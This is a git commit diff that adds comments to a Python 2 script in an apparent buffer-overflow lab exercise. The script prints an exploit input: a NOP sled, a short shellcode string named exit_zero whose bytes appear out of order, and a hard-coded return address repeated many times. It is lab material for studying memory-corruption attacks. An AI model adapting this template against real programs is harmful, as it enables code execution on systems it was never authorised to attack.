82285e661c2c4d748cef1cd53b02bcbb29c3367e
Gabriel Cruz <gabs.oficial98@gmail.com>
2018-12-12 11:41:32 -0200

    Add comments on python file

--- buffer-overflow/generateInput.py
+++ buffer-overflow/generateInput.py
@@ -1,9 +1,11 @@
 
 
-0xbfffeed8
-exit_zero = "\xc0\x31\x24\x04\x89\x80\xcd\x90"
-buf_addr = "\xd8\xfe\xff\xbf"
 nop = "\x90"
+exit_zero = "\xc0\x31\x24\x04\x89\x80\xcd\x90"
+
+# insert here the address of the buffer to be overflowed
+buf_addr = "\xd8\xfe\xff\xbf"
+
 code = exit_zero
 
 print 80*nop + code + buf_addr*350
